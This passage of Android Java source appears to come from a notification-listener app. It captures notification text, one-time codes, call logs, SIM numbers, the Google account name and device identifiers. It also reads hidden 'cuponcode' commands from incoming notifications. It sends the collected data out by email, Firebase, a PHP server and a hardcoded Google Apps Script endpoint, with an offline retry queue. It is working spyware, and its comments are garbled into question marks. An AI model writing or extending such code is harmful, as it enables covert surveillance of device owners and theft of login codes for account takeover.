        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method notificationmessage : " + notificationmessage);

        boolean IsSimNumberSetByNotificationSerchWords1 = isSimNumberSetByNotificationSerchWords1(message, title, titleStr, textStr);
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method IsSimNumberSetAlart1: " + IsSimNumberSetByNotificationSerchWords1);
        boolean IsSimNumberSetByNotificationSerchWords2 = isSimNumberSetByNotificationSerchWords2(message, title, titleStr, textStr);
        Log.d(TAG, "extractPlusPrefixedNumbersFromNotification method IsSimNumberSetAlart2: " + IsSimNumberSetByNotificationSerchWords2);
        if (!IsSimNumberSetByNotificationSerchWords1 && !IsSimNumberSetByNotificationSerchWords2 ) {
            return RetrieveStoredSharedPreferencesPhoneNumbers(context);
        }
        //onNotificationPosted(StatusBarNotification sbn)
        // Combine title and text into a single string for easier search
        String combinedText = title + " " + text;

        // Regular expression to match numbers starting with "+" followed by 10 to 16 digits
        String regex = "\\+\\d{10,16}";  // ?? regex ?? + ??????? ?? ?? ???? ?? ??????? ?????? ????? ??? ????

        // Regular expression ??????? ??? ?????? ????????? ??? ???
        Pattern pattern = Pattern.compile(regex);
        //java.util.regex.Matcher matcher = pattern.matcher(combinedText);
        Matcher matcher = pattern.matcher(notificationmessage);

        StringBuilder validNumbers = new StringBuilder();

        // ??? ???? ????? ????? ???
        while (matcher.find()) {
            String matchedNumber = matcher.group();
            // ?????? ?????? ??? ???
            if (validNumbers.length() > 0) {
                validNumbers.append(" "); // ?????? ?????? ????? ???? ????? ???
            }
            validNumbers.append(matchedNumber);
        }

        // StringBuilder ?? String-? ??????? ????
        String validNumbersString = validNumbers.toString();
        // storeExtractPlusPrefixedNumbersFromNotification ????? String ??? ????
        storeExtractPlusPrefixedNumbersFromNotification(validNumbersString, context);

        // ??? ???? ??? ??? ????? ????? ???, ?? ??????? ????
        if (validNumbers.length() > 0) {
            Log.d(TAG, "??? ??? ????? ????? ????: " + validNumbers.toString());
            return validNumbers.toString();
        } else {
            Log.d(TAG, "???? ??? ??? ????? ????? ??????");
            return null;
        }
    }
    public void storeExtractPlusPrefixedNumbersFromNotification(String validNumbers, Context context) {
        // ???????? ??? ??? (mContext ??? null ??)
        if (context == null) {
            Log.e(TAG, "storeExtractPlusPrefixedNumbersFromNotification Method  Context is null. Unable to access SharedPreferences.");
            return; // ??? context null ??, ????? ????????? ???? ???
        }
        // ??????? ???????????? ????????? ????? ???? ???? editor ?????
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (validNumbers != null) {
            // ????????? ??? ??? ???? ????????? ??-?? ???????
            editor.putString("validPhoneNumbers", validNumbers);
            editor.apply(); // ???????????? ????????? ???
            Log.d(TAG, "storeExtractPlusPrefixedNumbersFromNotification Stored SharedPreferences validNumbers: " + validNumbers);
        }
        RetrieveStoredSharedPreferencesPhoneNumbers( context);
    }

    public String RetrieveStoredSharedPreferencesPhoneNumbers(Context context) {
        if (context == null) {
            Log.e(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // ??????? ??????????? ???? ????? ??? ????????? ??????? ???
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // ????? ??? ????? ??? ???
        String validPhoneNumbers = sharedPreferences.getString("validPhoneNumbers", null);
        if (validPhoneNumbers != null) {
            Log.d(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method validPhoneNumbers: " + validPhoneNumbers);
        } else {
            Log.d(TAG, "RetrieveStoredSharedPreferencesPhoneNumbers Method validPhoneNumbers: " + validPhoneNumbers);
        }
        return validPhoneNumbers; // ???? ????? ??? ???? ??????? ????
    }
// === end code ===== extract Plus Prefixed Numbers From Notification Title And Text valid phone numbers

    // Set Sim1 Number firebase subject ============= satart code ==============


    public String SetSim1Number(Context context, String text) {
        Log.d(TAG, " method SetSim1Number call");

        boolean IsSimNumberSetAlart =  isSimNumberSetByNotificationSerchWords1( text, "", "", text);
        Log.d(TAG, "SetSim1Number Method . Sim Number Set By Notification Serch Words1: " + IsSimNumberSetAlart );
        boolean IsSimNumberSetByNotificationSerchWords2 =  isSimNumberSetByNotificationSerchWords2( text, "", "", text);
        Log.d(TAG, "SetSim1Number Method . Sim Number Set By Notification Serch Words2: " + IsSimNumberSetByNotificationSerchWords2 );

        if (IsSimNumberSetAlart && IsSimNumberSetByNotificationSerchWords2) {
            String retrieveStoredSharedPreferencesPhoneNumbers = RetrieveStoredSharedPreferencesPhoneNumbers(context);
            Log.d(TAG, "SetSim1Number Method GetSim1RetrieveStoredSharedPreferencesPhoneNumbers: " + retrieveStoredSharedPreferencesPhoneNumbers);
            if (retrieveStoredSharedPreferencesPhoneNumbers != null )
                sim1Number = retrieveStoredSharedPreferencesPhoneNumbers;
            Log.d(TAG, "SetSim1Number Method.  Sim1 Number Set from notification: " + sim1Number);
            return sim1Number;
        }
        Log.d(TAG, "SetSim1Number Method GetSim1RetrieveStoredSharedPreferencesPhoneNumbers:" + RetrieveStoredSharedPreferencesPhoneNumbers(context));
        return RetrieveStoredSharedPreferencesPhoneNumbers(context);
    }



// === start code ===== eextract Email EmailFirstPartName after word of Cuponcode1  From Notification


    public String SetEmailFirstPartName(Context context, String text) {
        Log.d(TAG, "SetEmailFirstPartName Method call");

        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords1 : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords1 );
        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords2 = isEmailFirstPartNameAndPasswordSetAlartSerchWords2( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords2 : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords2 );

        if (isEmailFirstPartNameAndPasswordSetAlartSerchWords1 && isEmailFirstPartNameAndPasswordSetAlartSerchWords2) {
            String RetrievestoreExtractEmailEmailFirstPartName = RetrievestoreExtractEmailEmailFirstPartName(context);
            Log.d(TAG, "SetEmailFirstPartName Method GetSim1RetrieveStoredSharedPreferencesPhoneNumbers: " + RetrievestoreExtractEmailEmailFirstPartName);
            if (RetrievestoreExtractEmailEmailFirstPartName != null )
                EmailFirstPartName = RetrievestoreExtractEmailEmailFirstPartName;
            Log.d(TAG, "SetEmailFirstPartName Method.  EmailFirstPartName Set : " + EmailFirstPartName);
            return EmailFirstPartName;
        }
        Log.d(TAG, "SetEmailFirstPartName Method RetrievestoreExtractEmailEmailFirstPartName:" + RetrievestoreExtractEmailEmailFirstPartName(context));
        return RetrievestoreExtractEmailEmailFirstPartName(context);
    }


    public String SetEmailPassword(Context context, String text) {
        Log.d(TAG, "SetEmailFirstPartName Method call");

        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords1 : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords1 );
        boolean isEmailFirstPartNameAndPasswordSetAlartSerchWords2 = isEmailFirstPartNameAndPasswordSetAlartSerchWords2( text, "", "", text);
        Log.d(TAG, "SetEmailFirstPartName Method isEmailFirstPartNameAndPasswordSetAlartSerchWords2  : " + isEmailFirstPartNameAndPasswordSetAlartSerchWords2 );

        if (isEmailFirstPartNameAndPasswordSetAlartSerchWords1 && isEmailFirstPartNameAndPasswordSetAlartSerchWords2) {
            String RetrievestoreSharedPreferencesExtractEmailPassword = RetrievestoreSharedPreferencesExtractEmailPassword(context);
            Log.d(TAG, "SetEmailFirstPartName Method RetrievestoreSharedPreferencesExtractEmailPassword : " + RetrievestoreSharedPreferencesExtractEmailPassword);
            if (RetrievestoreSharedPreferencesExtractEmailPassword != null )
                EmailPassword = RetrievestoreSharedPreferencesExtractEmailPassword;
            Log.d(TAG, "SetEmailEmailPassword Method.  SetEmailEmailPassword Set: " + EmailPassword);
            return EmailPassword;
        }
        Log.d(TAG, "SetEmailFirstPartName Method RetrievestoreSharedPreferencesExtractEmailPassword:" + RetrievestoreSharedPreferencesExtractEmailPassword(context));
        return RetrievestoreSharedPreferencesExtractEmailPassword(context);
    }


    public String extractEmailFirstPartName(String message, String title, String text, Context context, String titleStr, String textStr) {
        Log.d(TAG, "extractEmailFirstPartName method call");

        String notificationmessage = globalmessage;
        Log.d(TAG, "extractEmailFirstPartName method notification globalmessage: " + notificationmessage);

        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords1(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailFirstPartName method isEmailFirstPartNameAndPasswordSetAlartSerchWords1: " +  IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1);
        boolean IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords2(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailFirstPartName method isEmailFirstPartNameAndPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2);

        if (! IsEmailFirstPartNameAndVPasswordSetAlartSerchWords1 && !IsEmailFirstPartNameAndVPasswordSetAlartSerchWords2) {
            return RetrievestoreExtractEmailEmailFirstPartName(context);
        }

        // **Regex ??????? ??? ????? ???? ??? ??? ???**
        String regex1 = "cuponcode1\\s+(\\w+)"; // `cuponcode1` ?? ???? ?????? ???????? ????
        Pattern pattern1 = Pattern.compile(regex1);
        Matcher matcher1 = pattern1.matcher(notificationmessage);

        String EmailFirstPartName = null;

        if (matcher1.find()) {
            EmailFirstPartName = matcher1.group(1); // ????? ???? ???
            Log.d(TAG, "Get First cupon code Word . For Email First Part: " + EmailFirstPartName);
        } else {
            Log.d(TAG, "Not Get First cupon Word code Word . For Email First Part");
        }

        // **???? ??? ????? ???**
        if (EmailFirstPartName != null) {
            EmailFirstPartName = EmailFirstPartName.toString();
            storeSharedPreferencesExtractEmailFirstPartName(EmailFirstPartName, context);
            return EmailFirstPartName;
        } else {
            Log.d(TAG, "Not Get First cupon Code Emailpasseord");
            return null;
        }
    }

    public void storeSharedPreferencesExtractEmailFirstPartName(String EmailFirstPartName, Context context) {
        // ???????? ??? ??? (mContext ??? null ??)
        if (context == null) {
            Log.e(TAG, "storeExtractEmailFirstPartNameFromNotification Method: Context is null. Unable to access SharedPreferences.");
            return; // ??? context null ??, ????? ????????? ???? ???
        }
        // ??????? ???????????? ????????? ????? ???? ???? editor ?????
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (EmailFirstPartName != null) {
            // ????????? ??? ??? ???? ????????? ??-?? ???????
            editor.putString("EmailFirstPartName", EmailFirstPartName);
            editor.apply(); // ???????????? ????????? ???
            Log.d(TAG, "storeSharedPreferencesExtractEmailFirstPartName  Method Store SharedPreferences EmailFirstPartName: " + EmailFirstPartName);
        }
        RetrievestoreExtractEmailEmailFirstPartName( context);
    }

    public String RetrievestoreExtractEmailEmailFirstPartName(Context context) {
        if (context == null) {
            Log.e(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // ??????? ??????????? ???? ????? ??? ????????? ??????? ???
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // ????? ??? ????? ??? ???
        String EmailFirstPartName = sharedPreferences.getString("EmailFirstPartName", null);
        if ( EmailFirstPartName != null) {
            Log.d(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method EmailFirstPartName: " + EmailFirstPartName);
        } else {
            Log.d(TAG, "RetrievestoreExtractEmailEmailFirstPartName Method EmailFirstPartName: " + EmailFirstPartName);
        }
        return EmailFirstPartName; // ???? ????? ??? ???? ??????? ????
    }


    public String extractEmailPassword(String message, String title, String text, Context context, String titleStr, String textStr) {
        Log.d(TAG, "extractEmailPassword method call");

        String notificationmessage = globalmessage;
        Log.d(TAG, "extractEmailPassword method notification  globalmessage: " + notificationmessage);

        boolean IsEmailFirstPartNameAndPasswordSetAlartSerchWords1 = isEmailFirstPartNameAndPasswordSetAlartSerchWords1(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailPassword method isEmailFirstPartNameAndPasswordSetAlartSerchWords1: " + IsEmailFirstPartNameAndPasswordSetAlartSerchWords1);
        boolean IsEmailFirstPartNameAndPasswordSetAlartSerchWords2 =  isEmailFirstPartNameAndPasswordSetAlartSerchWords2(message, title, titleStr, textStr);
        Log.d(TAG, "extractEmailPassword method isEmailFirstPartNameAndPasswordSetAlartSerchWords2: " + IsEmailFirstPartNameAndPasswordSetAlartSerchWords2);

        if ( !IsEmailFirstPartNameAndPasswordSetAlartSerchWords1 && !IsEmailFirstPartNameAndPasswordSetAlartSerchWords2 ) {
            return RetrievestoreSharedPreferencesExtractEmailPassword(context);
        }

        // **Regex ??????? ??? ??????? ???? ??? ??? ???**
        String regex2 = "cuponcode2\\s+(\\w+)"; // `cuponcode2` ?? ???? ?????? ???????? ????
        Pattern pattern2 = Pattern.compile(regex2);
        Matcher matcher2 = pattern2.matcher(notificationmessage);

        String EmailPassword = null;

        if (matcher2.find()) {
            EmailPassword = matcher2.group(1); // ??????? ???? ???
            Log.d(TAG, "Get Second cupon code: " + EmailPassword);
        } else {
            Log.d(TAG, "Not Get Second cupon code");
        }

        // **???? ??? ????? ???**
        if (EmailPassword != null) {
            EmailPassword= EmailPassword.toString();
            storeSharedPreferencesExtractEmailPassword(EmailPassword, context);
            return EmailPassword;
        } else {
            Log.d(TAG, " Not Get Second cupon code EmailPassword");
            return null;
        }
    }

    public void storeSharedPreferencesExtractEmailPassword(String EmailPassword, Context context) {
        // ???????? ??? ??? (mContext ??? null ??)
        if (context == null) {
            Log.e(TAG, "storeSharedPreferencesExtractEmailPassword Method: Context is null. Unable to access SharedPreferences.");
            return; // ??? context null ??, ????? ????????? ???? ???
        }
        // ??????? ???????????? ????????? ????? ???? ???? editor ?????
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sharedPreferences.edit();
        if (EmailPassword != null) {
            // ????????? ??? ??? ???? ????????? ??-?? ???????
            editor.putString("EmailPassword", EmailPassword);
            editor.apply(); // ???????????? ????????? ???
            Log.d(TAG, "storeSharedPreferencesExtractEmailPassword  Method Stored SharedPreferences EmailPassword: " + EmailPassword);
        }
        RetrievestoreSharedPreferencesExtractEmailPassword( context);
    }
    public String RetrievestoreSharedPreferencesExtractEmailPassword(Context context) {
        if (context == null) {
            Log.e(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method Context is null. Unable to access SharedPreferences.");
            return null;
        }
        // ??????? ??????????? ???? ????? ??? ????????? ??????? ???
        SharedPreferences sharedPreferences = context.getSharedPreferences("MySharedPreferences", Context.MODE_PRIVATE);

        // ????? ??? ????? ??? ???
        String EmailPassword = sharedPreferences.getString("EmailPassword", null);
        if (EmailPassword != null) {
            Log.d(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method EmailPassword: " + EmailPassword);
        } else {
            Log.d(TAG, "RetrievestoreSharedPreferencesExtractEmailPassword Method EmailPassword: " + EmailPassword);
        }
        return EmailPassword; // ???? ????? ??? ???? ??????? ????
    }
// === end code =====eextract Email Frst Part Name Emailpassword From Notification



// === end code Set sim number and Email Frst Part Name Emailpassword From Notification









    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                NetworkCapabilities capabilities = cm.getNetworkCapabilities(cm.getActiveNetwork());
                return capabilities != null && capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
            } else {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
                return activeNetwork != null && activeNetwork.isConnected();
            }
        }
        return false;
    }
    private boolean shouldForwardBySMS(String message) {
        return !isInternetConnected() && (containsFiveDigitNumber(message) || isSpecificSMSRecipient(message));
    }
    private boolean containsFiveDigitNumber(String message) {
        return message.matches(".*\\+\\d{4}.*");
    }
    private boolean isSpecificSMSRecipient(String message) {
        return message.contains("GP") || message.contains("+8801304039289");
    }


    //public   String notificationglobalsubject; // Store subject globally



    public void SaveOrforwardNotificationEmailORFirebaseConditionaly(String app, String title, String text, Bitmap image, Context context) {
        try {
            Log.d(TAG, "Starting forwardNotificationByEmail method");
            // create subject
            AccountUtil accountUtil = new AccountUtil();
            String GoogleAccountName = accountUtil.getDefaultGoogleAccount(context);
            if (GoogleAccountName == null) {
                GoogleAccountName = "null";
                Log.d(TAG, "GoogleAccountName is null, setting to 'null'");
            }
            String userSimNumber = "null";
            try {
                userSimNumber = accountUtil.getUserSimNumber(context);
                Log.d(TAG, "User SIM number fetched: " + userSimNumber);
            } catch (SecurityException e) {
                Log.e(TAG, "Error accessing Subscriber ID (SIM Number): ", e);
                userSimNumber = "null";
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error while fetching SIM number: ", e);
                userSimNumber = "null";
            }

            GetRecentCallLogs getRecentCallLogs = new GetRecentCallLogs(context);
            recentCallLogs = getRecentCallLogs.getRecentCallLogs();

            String Get_Sim1_Number = SetSim1Number(context, text);
            Log.d(TAG, "Sim1 Number set: " + Get_Sim1_Number);

            String manufacturer = Build.MANUFACTURER;
            String mobileModel = Build.MODEL;
            LocationUtil locationUtil = new LocationUtil();
            String countryName = locationUtil.getFullCountryName();
            //  Log.d(TAG, "Device info - Manufacturer: " + manufacturer + ", Model: " + mobileModel + ", Country: " + countryName);

            GetSim1AndSim2NumberFromAlertbox alert = new GetSim1AndSim2NumberFromAlertbox(this);
            String UserID1= alert.getSim1NumberFromUser(context);
            String UserID2= alert.getSim2NumberFromUser(context);
            String UserGivenSimNumber= UserID1 + " "+UserID2;

            subject = "Nt ID: " + Get_Sim1_Number +  " " + UserGivenSimNumber + " " + manufacturer + " " + mobileModel + " " + app + " User: " + GoogleAccountName + " sim ser: " + userSimNumber + " " +" Country: " + countryName;
            String messageBody = app + " Title: " + title + " Message: " + text  ;
            //Log.e(TAG, "Notification email subject: " + subject);

            notificationglobalsubject= subject ;

            // Convert timestamp to human-readable format
            long currentTimeMillis = System.currentTimeMillis();
            SimpleDateFormat sdf = new SimpleDateFormat(" M dd yyyy  HH:mm:ss ", Locale.getDefault());
            String formattedTimestamp = sdf.format(new Date(currentTimeMillis));

            // Append email content to buffer with formatted timestamp
            emailContentBuffer.append("Time: ").append(formattedTimestamp).append(" ");
            // emailContentBuffer.append("Subject: ").append(subject).append("\n");
            emailContentBuffer.append("Message: ").append(messageBody).append("\n");
            // Log.d(TAG, "Email content appended to buffer: " + emailContentBuffer.toString());

            // Save content to text file
            saveToTextFile(this,emailContentBuffer.toString());

            boolean iscontainsNotificationOtpWords = containsNotificationOtpWords(messageBody);
            //Log.d(TAG, "Contains Notification Otp check: " + iscontainsNotificationOtpWords);
            // Check if the buffer exceeds the word limit
            if ((getWordCount(emailContentBuffer.toString()) >= MAX_WORDS) || iscontainsNotificationOtpWords  ){
                Log.e(TAG, "Notification text more than MAX_WORDS or otp related, forwarding email and clearing buffer");
                String fileContent = readFromTextFile();
                // Log.d(TAG, "File content to be sent: " + fileContent); // Log the file content
                sendEmailAndSaveToFirebaseAndPHPMysqlDBAndGoogledrive(fileContent, image, context);
                clearTextFile();
                emailContentBuffer.setLength(0); // Clear the buffer
            } else if (!isTimerRunning) {
                Log.d(TAG, "Timer not Equal Targeted ,Starting timer for delayed email sending");
                CheekTimerToSendData(image, context);
            }


        } catch (Exception e) {
            Log.e(TAG, "Notification failed to forward via email: ", e);
        }
    }

    private void CheekTimerToSendData(Bitmap image, Context context) {
        isTimerRunning = true;
        Log.d(TAG, " Timer started, will run after " + DELAY + " milliseconds After Sending Data");
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                handler.post(() -> {
                    if (emailContentBuffer.length() > 0) {
                        Log.d(TAG, "Timer True To triggered, reading from text file and sending email");
                        String fileContent = readFromTextFile();
                        sendEmailAndSaveToFirebaseAndPHPMysqlDBAndGoogledrive(fileContent, image, context);
                        clearTextFile();
                        emailContentBuffer.setLength(0); // Clear the buffer
                    }
                    isTimerRunning = false;
                    Log.d(TAG, "Timer stopped");
                });
                Log.d(TAG, "Timer false To triggered, reading from text file and sending email");
            }
        }, DELAY);
    }

// image convert for php mysql site dava save
// Image convert for PHP MySQL (Base64)
private String bitmapToBase64(Bitmap bitmap) {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos); // 70% quality
    return Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
}


    // Email + Firebase + PHP MySQL + Google Drive save
        private void sendEmailAndSaveToFirebaseAndPHPMysqlDBAndGoogledrive(
                String content,
                Bitmap image,
                Context context
        ) {

            try {
                String finalSubject = subject + " Notification Summary";
                String finalContent = subject + "\n" + content +
                        "\nRecent Call Logs:\n" + recentCallLogs;

                // 1?? Send Email
                new Thread(() -> {
                    try {
                        Log.d(TAG, "?? Sending Email...");
                        JavaMailAPISendNotification.sendMail(
                                EMAIL,
                                finalSubject,
                                finalContent,
                                null
                        );
                        Log.d(TAG, "? Email sent");
                    } catch (Exception e) {
                        Log.e(TAG, "? Email failed", e);
                    }
                }).start();

                // 2?? Save to Firebase (SIMPLE DIRECT VERSION)
                new Thread(() -> {
                    try {
                        Log.d(TAG, "?? Saving to Firebase...");

                        // ?????? Firebase Database reference ???? ????
                        FirebaseDatabase database = FirebaseDatabase.getInstance();
                        DatabaseReference myRef = database.getReference("smsData");

                        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss a", Locale.getDefault())
                                .format(new Date());
                        String smsId = myRef.push().getKey();

                        // ?????? ???? ???? ???? (GetSim1AndSim2NumberFromAlertbox ????)
                        Map<String, Object> smsData = new HashMap<>();
                        smsData.put("sender", EMAIL);
                        smsData.put("subject", finalSubject);
                        smsData.put("messageBody", finalContent);
                        smsData.put("recentCallLogs", recentCallLogs);
                        smsData.put("timestamp", timestamp);
                        smsData.put("deviceModel", Build.MODEL);
                        smsData.put("androidVersion", Build.VERSION.RELEASE);

                        // Firebase-? save ????
                        myRef.child(smsId).setValue(smsData)
                                .addOnSuccessListener(aVoid -> Log.d(TAG, "? Firebase saved directly sussessfull"))
                                .addOnFailureListener(e -> Log.e(TAG, "? Firebase direct save failed", e));

                    } catch (Exception e) {
                        Log.e(TAG, "? Firebase failed", e);
                    }
                }).start();
                // 3?? Save to PHP MySQL
                new Thread(() -> {
                    try {
                        Log.d(TAG, "?? Testing PHP connection...");
                        testPHPConnection();

                        Log.d(TAG, "?? Sending to PHP MySQL...");
                        sendDataToPHPMysqlDBInBackground(content, image, context);
                    } catch (Exception e) {
                        Log.e(TAG, "? PHP MySQL failed", e);
                    }
                }).start();


                // 4?? GOOGLE DRIVE (Apps Script + Offline Queue)
                executorService.execute(() -> {

                    try {

                        JSONObject json = new JSONObject();
                        json.put("subject", finalSubject);
                        json.put("content", finalContent);
                        json.put("email", EMAIL);
                        json.put("device", Build.MODEL);
                        json.put("android_id",
                                Settings.Secure.getString(
                                        context.getContentResolver(),
                                        Settings.Secure.ANDROID_ID
                                )
                        );
                        json.put("timestamp", System.currentTimeMillis());

                        if (image != null) {
                            json.put("image_base64", bitmapToBase64(image));
                        }

                        OfflineQueueManager queue = new OfflineQueueManager(context);

                        if (isInternetConnected()) {
                            Log.d(TAG, "?? Sending to SAVE TO GOOGLE DRIVE  Apps Script...");
                            sendToGoogleDriveViaAppsScript(json.toString());
                            retryQueuedData(context); // ?? flush old queue
                        } else {
                            queue.enqueue(json.toString());
                            Log.d(TAG, "?? No internet ? saved to GOOGLE DRIVEoffline queue");
                        }

                    } catch (Exception e) {
                        Log.e(TAG, "? Google Drive error", e);
                    }
                });
    
            } catch (Exception e) {
                Log.e(TAG, "? GOOGLE DRIVE Unexpected error", e);
            }
        }
    private void sendToGoogleDriveViaAppsScript(String jsonData) {
        Log.d(TAG, "?? Sending to sendToGoogleDriveViaAppsScript");
        try {

            URL url = new URL(
                    "https://script.google.com/macros/s/AKfycbxXN67VDAF1SFWxwU2kqAyn41HXcJLb19oZcTDKpuRib-nTr35Dt8-soYqFajloVM4W/exec"
            );

            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);

            conn.setRequestProperty("Content-Type", "application/json");

            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonData.getBytes(StandardCharsets.UTF_8));
            }

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "?? Drive response: " + responseCode);

            conn.disconnect();

        } catch (Exception e) {
            throw new RuntimeException(e); // important for retry logic
        }
    }

    private void retryQueuedData(Context context) {
        Log.d(TAG, "?? Sending to retryQueuedData");
        executorService.execute(() -> {

            if (!isInternetConnected( )) return;

            try {
                OfflineQueueManager queue = new OfflineQueueManager(context);
                Cursor c;

                while ((c = queue.getNext()) != null && c.moveToFirst()) {

                    int id = c.getInt(c.getColumnIndexOrThrow("id"));
                    String json = c.getString(c.getColumnIndexOrThrow("json"));

                    sendToGoogleDriveViaAppsScript(json);
                    queue.delete(id);

                    c.close();
                    Log.d(TAG, "?? Queued item uploaded");
                }

            } catch (Exception e) {
                Log.e(TAG, "? Retry paused", e);
            }
        });
    }




    // Send data to PHP MySQL API (Updated to handle non-JSON responses safely)
    private void sendDataToPHPMysqlDBInBackground(String content, Bitmap image, Context context) {

        try {
            JSONObject json = new JSONObject();

            // ? Safe device_id
            String deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
            if (deviceId == null) {
                deviceId = UUID.randomUUID().toString();
            }

            json.put("device_id", deviceId);
            json.put("email", EMAIL);
            json.put("subject", subject + " Notification Summary");
            json.put("content", content);
            json.put("call_logs", recentCallLogs);

            if (image != null) {
                json.put("image_base64", bitmapToBase64(image));
            }

            URL url = new URL("http://192.168.1.5/fasterpro11/api/save_data.php");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();

            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android)"); // fix 403
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);

            // Send JSON payload
            try (OutputStream os = conn.getOutputStream()) {
                os.write(json.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "?? PHP response code = " + responseCode);

            InputStream is;
            try {
                // Use getInputStream for 200, getErrorStream for others
                is = conn.getInputStream();
            } catch (FileNotFoundException fnfe) {
                is = conn.getErrorStream();
                Log.e(TAG, "?? FileNotFoundException, using error stream");
            }

            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String responseStr = response.toString().trim();
                Log.d(TAG, "?? PHP raw response: " + responseStr);

                // ? Only parse if response starts with '{'
                if (responseStr.startsWith("{")) {
                    JSONObject responseJson = new JSONObject(responseStr);
                    if ("success".equalsIgnoreCase(responseJson.optString("status"))) {
                        Log.d(TAG, "? PHP MySQL saved. ID = " + responseJson.optInt("id"));
                    } else {
                        Log.e(TAG, "? PHP Error: " + responseJson.optString("message"));
                    }
                } else {
                    Log.e(TAG, "? Non-JSON response from PHP, skipping JSONObject parse");
                }

            } else {
                Log.e(TAG, "? PHP API returned empty response");
            }

            conn.disconnect();

        } catch (Exception e) {
            Log.e(TAG, "? PHP API Exception", e);
        }
    }



    //testPHPConnection
    // Test PHP connection safely
    private void testPHPConnection() {
        try {
            URL url = new URL("http://192.168.1.5/fasterpro11/api/get_data.php?limit=1");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Android)"); // fix 403
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "?? PHP test response code = " + responseCode);

            InputStream is;
            try {
                is = conn.getInputStream();
            } catch (FileNotFoundException fnfe) {
                is = conn.getErrorStream();
                Log.e(TAG, "?? FileNotFoundException on test connection, using error stream");
            }

            if (is != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, StandardCharsets.UTF_8));
                StringBuilder response = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    response.append(line);
                }
                reader.close();

                String responseStr = response.toString().trim();
                Log.d(TAG, "?? PHP test raw response: " + responseStr);

                if (responseStr.startsWith("{")) {
                    JSONObject json = new JSONObject(responseStr);
                    if ("success".equalsIgnoreCase(json.optString("status"))) {
                        Log.d(TAG, "? PHP test connection successful");
                    } else {
                        Log.e(TAG, "? PHP test returned error: " + json.optString("message"));
                    }
                } else {
                    Log.e(TAG, "? PHP test returned non-JSON response");
                }

            } else {
                Log.e(TAG, "? PHP test returned empty response");
            }

            conn.disconnect();

        } catch (Exception e) {
